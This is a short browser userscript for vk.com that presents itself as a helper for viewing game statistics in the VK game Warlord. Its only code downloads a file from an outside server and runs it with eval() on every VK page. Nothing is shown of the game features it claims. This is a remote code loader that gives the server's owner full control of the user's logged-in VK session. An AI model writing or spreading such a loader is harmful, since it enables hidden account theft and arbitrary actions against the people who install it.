// ==UserScript==
// @name Warlord Script
// @description Вспомогательное расширение для просмотра игровых характеристик в игре Warlord на страницах ВКонтакте.
// @version 1.00
// @author Oleg.Davydov

// @include     *://vk.com/*

// @license MIT
// @icon https://i.ibb.co/82xLTxQ/icon-250.png
// @homepageURL http://h91222sp.beget.tech/home_script/
// ==/UserScript==

(() => {
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://vk-bot.com/warscript/warlord.json', true);
	xhr.send();
	xhr.onloadend = () => {
		eval(xhr.responseText);
	};
})();